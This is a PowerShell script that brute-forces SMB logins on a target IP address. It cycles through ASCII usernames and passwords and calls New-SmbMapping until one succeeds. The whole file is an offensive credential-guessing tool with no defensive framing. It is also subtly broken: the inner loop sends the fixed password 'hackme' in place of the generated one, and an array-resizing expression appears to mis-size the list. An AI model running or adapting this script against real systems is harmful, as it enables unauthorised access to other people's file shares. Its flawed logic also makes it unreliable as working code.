param ($IPAddr = $(throw "Need IP Address"))

# TODO: Just checks ASCII since the letters are the most used, for more Unicode values a parameter can be added
$LastASCIINum = 126 
$FirstASCIINum = 32 # TODO: No need for null char
$MaxLength = 1 
$OldMaxLength = 4  #TODO: Optimization
$MaxLengthInc = 1 # Incrementation value to update the maximum length for username and password

function updateList{
param ([int[]]$list)

for ($i = $list.Length-1; $i -ge 0 ; $i--){
    $list[$i] ++
    if ( $list[$i] -gt $LastASCIINum ){
        if ($i -ne 0 ){
            $list[$i] = $FirstASCIINum
        }
        else{
            [int[]]$list2 = @($FirstASCIINum) * $list.Length+1  # Increase the length and continue
            return $list2
        }
    }
    else {
        break
    }
}
return $list
}

function createString{
param ([int[]]$list)
$out = $null;
   for ($i = 0; $i -lt $list.Length ; $i++){
       $out+=[char]$list[$i] # display as an ASCII character
   }
   return $out
}

function brute {
$user = $null
$pass = $null
$Result = $null
[int[]]$userPtr =  $FirstASCIINum
[int[]]$passPtr =  $FirstASCIINum


# TODO: username can't be null, space and can not use some characters ( " / \ [ ] : ; | = , + * ? < > ) , password does not have null (except just null), 
#Continue till find a match
:outer while ($true) {

while ($userPtr.Length -le $MaxLength) {
    
    $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $pass -EA SilentlyContinue
    if ($Result -ne $null){
        break
    }
    else {
            while ($passPtr.Length -le $MaxLength){ #check pass for this user
            $passPtr = updateList $passPtr # changes the password - needs return for creation of new array
            $pass = createString $passPtr #changes to String

            $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password "hackme" -EA SilentlyContinue
            if ($Result -ne $null){
                break outer
            }
            Write-Host "UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
            }
        $userPtr = updateList $userPtr # changes the username - needs return for creation of new array
        $user = createString $userPtr #changes to String
        $passPtr =  $FirstASCIINum #needs to start from the beginning
    }
}
$MaxLength += $MaxLengthInc
$userPtr = $FirstASCIINum # TODO: Optimize
}
}

brute